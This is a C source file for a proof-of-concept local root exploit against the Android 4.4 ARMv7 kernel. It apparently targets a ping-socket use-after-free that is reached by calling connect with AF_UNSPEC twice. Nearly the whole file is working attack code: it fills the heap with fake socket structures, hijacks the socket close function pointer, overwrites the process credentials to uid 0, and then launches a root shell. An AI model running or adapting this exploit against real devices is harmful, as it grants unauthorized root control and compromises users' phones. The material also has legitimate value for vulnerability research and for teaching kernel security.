// arm-linux-gnueabi-gcc exploit_arm.c -static -o exploit_arm

// This PoC is tested on Android 4.4 KitKat ARMv7
// Linux version 3.10.0+ (wdu@wdu0.mtv.corp.google.com) (gcc version 4.9.x 20150123 (prerelease) (GCC) ) #2 SMP PREEMPT Fri Aug 4 15:12:26 PDT 2017

#define _GNU_SOURCE	// for cpu_affinity
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <linux/in.h>

#define AVOID_OOM_KILLER (-17)
#define LIST_POISON2     (0x200200)
#define NSEC_PER_SEC     (1000000000L)
#define OBJS_PER_SLAB    (28)
#define PAGES_PER_SLAB   (4)
#define OBJS_PER_PAGE    ((OBJS_PER_SLAB)/(PAGES_PER_SLAB))
#define OBJS_PER_2PAGE   ((OBJS_PER_PAGE)*2)
#define N_CHILDREN       (OBJS_PER_2PAGE)
#define N_SPRAY_PAGES    (0x30000)

static int set_oom_adj(int score);
static int cpu_affinity(int cpu_id);
static void* mmap_lock(void *addr, uint32_t n);

static int maximize_rlimit(int resource);
static int* prepare_vuln_socks(int *pnfds);
static void child_task(int limit);
static int overwrite_sock(int *fds, int n);

static void get_root(void);

__attribute__ ((constructor))
void init(void){
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	if(set_oom_adj(AVOID_OOM_KILLER) < 0)
		printf("[-] unable to disable oom killer\n");
}

int main(void){
	int nfds, *vulnfds, targetfd;

	// use up highmem
	for(int i = 0; i < 100; i++)
		mmap_lock(NULL, 1024);

	if(!(vulnfds = prepare_vuln_socks(&nfds)))
		exit(-1);

	// for debug
	// cpu_affinity(0);

	if((targetfd = overwrite_sock(vulnfds, nfds)) < 0){
		printf("[-] target socket not found...\n");
		for(;;)
			sleep(1);
	}

	// EXPLOIT !!!!
	close(targetfd);

	if(getuid())
		printf("[-] fail to get root...\n");
	else {
		char *argv[] = {"/system/bin/sh", NULL};
		char *envp[] = {"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin", "LD_LIBRARY_PATH=/vendor/lib:/system/lib", NULL};
		execve(argv[0], argv, envp);
	}

	for(;;)
		sleep(1);
}

static int set_oom_adj(int score){
	int fd;

	if((fd = open("/proc/self/oom_adj", O_WRONLY)) < 0) {
		perror("open /proc/self/oom_adj");
		return -1;
	}

	if(dprintf(fd, "%d", score) < 0)
		return -1;

	close(fd);

	return 0;
}

static int cpu_affinity(int cpu_id){
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(cpu_id, &mask);

  if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
	  return -1;

  return 0;
}

static void* mmap_lock(void *addr, uint32_t n){
	void *p;

	p = mmap(addr, 0x1000*n, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE|(addr?MAP_FIXED:0), -1, 0);
	if(addr ? p!=addr : p == MAP_FAILED){
		perror("mmap");
		return MAP_FAILED;
	}

	/*
	if(mlock(p, 0x1000*n)){
		perror("mlock");
		munmap(p, 0x1000*n);
		return MAP_FAILED;
	}
	 */

	return p;
}

static int maximize_rlimit(int resource){
	struct rlimit rlim;

	if(getrlimit(resource, &rlim)){
		perror("getrlimit");
		return -1;
	}

	rlim.rlim_cur = rlim.rlim_max;
	if(setrlimit(resource, &rlim)){
		perror("setrlimit");
		return -1;
	}

	return rlim.rlim_max;
}

static int* prepare_vuln_socks(int *pnfds){
	struct sockaddr addr_inet 	= { .sa_family = AF_INET };
	struct sockaddr addr_unspec = { .sa_family = AF_UNSPEC };
	int fd_limit, nfds;
	int *sockfds;

	if(!(fd_limit = maximize_rlimit(RLIMIT_NOFILE)+1))
		return NULL;

	for(int i = 0; i < N_CHILDREN; i++){
		pid_t pid;
		if(!(pid = fork()))
			child_task(fd_limit);
		waitpid(pid, NULL, WUNTRACED);
	}

	kill(0, SIGCONT);
	for(int i = 0; i < N_CHILDREN; i++)
		waitpid(0, NULL, WUNTRACED);

	nfds = fd_limit/2;
	sockfds = (int*)malloc(sizeof(int)*nfds);
	for(int i = 0; i < nfds; i++){
		if((sockfds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)) < 0) {
			nfds = i;
			break;
		}

		if(connect(sockfds[i], &addr_inet, sizeof(addr_inet)) < 0){
			perror("connect AF_INET");
			goto FAIL;
		}
	}
	printf("[+] %d sockets recreated\n", nfds + 1);

	kill(0, SIGCONT);
	for(int i = 0; i < N_CHILDREN; i++)
		waitpid(0, NULL, 0);

	printf("[+] all child processes finished\n");

	if(mmap_lock((void*)(LIST_POISON2 & ~(0x1000-1)), 1) == MAP_FAILED)
		goto FAIL;

	for(int i = 0; i < nfds; i++){
		if(!(i%10))
			printf("\r[*] make sockets vulnerable (%d/%d)", i, nfds + 1);

		if(connect(sockfds[i], &addr_unspec, sizeof(addr_unspec)) < 0 || connect(sockfds[i], &addr_unspec, sizeof(addr_unspec)) < 0){
			perror("connect AF_UNSPEC");
			goto FAIL;
		}
	}

	printf("\r[+] create %d vulnerable sockets complete!!\n", nfds + 1);
	goto END;

FAIL:
	free(sockfds);
	sockfds = NULL;
	nfds = -1;
END:
	*pnfds = nfds;
	return sockfds;
}

__attribute__((noreturn))
static void child_task(int limit){
	pid_t pid;
	int *sockfds;

	pid = getpid();

	sockfds = (int*)malloc(sizeof(int)*limit);
	for(int i = 0; i < limit; i++)
		if((sockfds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP)) < 0) {
			limit = i;
			break;
		}
	printf("[%d] %d sockets created\n", pid, limit + 1);

	kill(pid, SIGSTOP);

	for(int i = 0; i < limit; i += OBJS_PER_PAGE){
		close(sockfds[i]);
		sockfds[i] = -1;
	}
	printf("[%d] %d sockets closed\n", pid, limit/OBJS_PER_PAGE + 1);

	kill(pid, SIGSTOP);

	for(int i = 0; i < limit; i++)
		if(sockfds[i] > 0)
			close(sockfds[i]);

	free(sockfds);
	exit(0);
}

static int overwrite_sock(int *fds, int n){
	/* 
	 * sk->sk_prot			(ebx + 0x20)  : function double pointer
	 *     sk_prot->close	(ecx + 0x0)   : function pointer
	 * sk->mc_list			(esi + 0x1dc) : zero
	 */
	struct sock {
		uint8_t x1[0x20];
		uint32_t *sk_prot;
		uint8_t x2[0x1b8];
		uint32_t *mc_list;
		uint8_t x3[0x60];
	};
	void *user, *pfunc = get_root;

	if((user = mmap_lock(NULL, N_SPRAY_PAGES)) == MAP_FAILED)
		return -1;

	memset(user, 0x41, N_SPRAY_PAGES*0x1000);
	for(void *p = user; p < user+0x800; p += 0x100)
		for(int i = 0; i < (N_SPRAY_PAGES*0x1000 - (p-user))/sizeof(struct sock); i++){
			struct sock *sk = &((struct sock*)p)[i];

			sk->sk_prot = (void*)&pfunc;
			sk->mc_list = NULL;
		}
	printf("[*] spray fake sock in user memory : %p\n", user);

	for(int i = 0; i < n; i++){
		struct timespec tv = {0};
		uint64_t sk_stamp;
		
		if(ioctl(fds[i], SIOCGSTAMPNS, &tv) < 0)
			continue;

		sk_stamp = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
		if((uint32_t)sk_stamp == 0x41414141){
			printf("[+] FOUND! (fd:%d, sk_stamp:%016llx)\n", fds[i], sk_stamp);
			return fds[i];
		}

		printf("[-] NOT MATCH (fd:%d, sk_stamp:%016llx)\n", fds[i], sk_stamp);
	}

	return -1;
}

/*
// auxiliary functions
struct state {
	uint32_t cpsr;
	uint32_t fp;
	uint32_t pc;
} stat;

static void save_state(void) {
	asm(
	"mrs r0, cpsr\n"
	"push {r0}\n"
	);
	memcpy(&stat, current_stack_pointer, sizeof(stat));
    asm("add sp, sp, #0x4");
}

static void restore_state(void){
    asm("sub sp, sp, #0x4");
	memcpy(current_stack_pointer, &stat, sizeof(stat));
    asm(
	"pop {r0}\n"
	"msr cpsr, r0\n"
	"pop {fp,pc}\n"
	);

	__builtin_unreachable();
}
*/

#define THREAD_SIZE   (0x1000<<1)
#define get_current() (current_thread_info()->task)
#define current       (get_current())

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;
};

struct task_struct {
	uint8_t x1[0x31c];
	struct cred *real_cred;
	struct cred *cred;
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
};

register void *current_stack_pointer asm("sp");
static inline struct thread_info *current_thread_info(void){
	return (struct thread_info *)((uint32_t)current_stack_pointer & ~(THREAD_SIZE - 1));
}

static void get_root(void){
	struct cred *cred;

	cred = current->cred;
	cred->uid   = 0;
	cred->gid   = 0;
	cred->suid  = 0;
	cred->sgid  = 0;
	cred->euid  = 0;
	cred->egid  = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;
}
